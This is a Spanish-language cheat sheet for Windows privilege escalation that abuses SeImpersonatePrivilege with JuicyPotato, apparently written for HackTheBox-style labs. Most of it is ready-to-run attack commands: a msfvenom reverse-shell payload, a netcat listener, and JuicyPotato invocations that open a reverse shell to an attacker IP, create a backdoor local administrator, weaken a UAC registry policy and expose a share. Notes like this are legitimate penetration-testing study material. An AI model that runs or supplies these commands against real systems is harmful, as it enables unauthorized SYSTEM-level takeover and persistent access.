Impersonate

JuicyPotato / JuicyPotatoNG

SeImpersonatePrivilege permite suplantar tokens bajo ciertas condiciones; no es una shell SYSTEM automática. Las técnicas Potato/PrintSpoofer dependen del contexto del servicio, versión de Windows y mitigaciones aplicadas.

Juicy Potato 32 Bits NetCat 32 Bits

  • Windows 7, 8.1, 10(<1809),Windows Server 2008/2012/2016
  • SeImpersonate o SeAssignPrimaryToken

Preparación

# Payload
msfvenom -p windows/shell_reverse_tcp LHOST=<kali_ip> LPORT=443 -f exe > backdoor.exe
# Subir nc/backdoor y JuicyPotato en una carpeta C:/temp
upload /backdoor.exe .
upload /nc.exe .
upload /JuicyPotato.exe .
# Listener
rlwrap nc -nlvp 443

CMD: JuicyPotato Payloads

# NetCat
JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c C:\Windows\Temp\prives\nc.exe <kali_ip> 443 -e cmd.exe" -t *

# Backdoor
JuicyPotato.exe -l 53375 -p backdoor.exe -t *
JuicyPotato.exe -l 53375 -p C:\Windows\Temp\prives\backdoor.exe -t *

# Agregar usuario y hacerlo administrador local -> Máquina Jeeves HTB (S4vitar)
JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c net user alvaro ruiz123$! /add" -t *
JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c net localgroup Administrators alvaro /add" -t *
# Ajustes
JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c reg add  HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f" -t * # En caso de no aparecer el usuario como Pwned a pesar de ser administrador local
JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c net share attacker_folder=C:\Windows\Temp /GRANT:Administrators,FULL" -t * # En caso de no obtener CMD a pesar de poner Pwned

# Subir JuicyPotato.exe y nc.exe
JuicyPotato.exe -l 53375  -p c:\windows\system32\cmd.exe -a "/c C:\Windows\Temp\prives\nc.exe 10.10.16.69 443 -e cmd.exe" -t *

# CLSID manual (Sin el parámetro -c escoge uno por defecto: BITS)
JuicyPotato.exe -l 53375 -p backdoor.exe -t * -c {4991d34b-80a1-4291-83b6-3328366b9097}

CLSID (identificador único global de objetos de clase COM) para los diferentes sistemas operativos

JuicyPotato: Argumentos

-l: Cualquier puerto local para COM trigger -> 1337 / 53375
-p: Programa a ejecutar
-t: Abusar de SeImpersonate o SeAssignPrimaryToken (* ambas)
-a: Argumento de -p

Error JuicyPotato -> Churrasco The Image file C:... is valid, but is for a machine type other than the current machine. ``python title:"Churrasco" churrasco.exe -d <Payload> ``
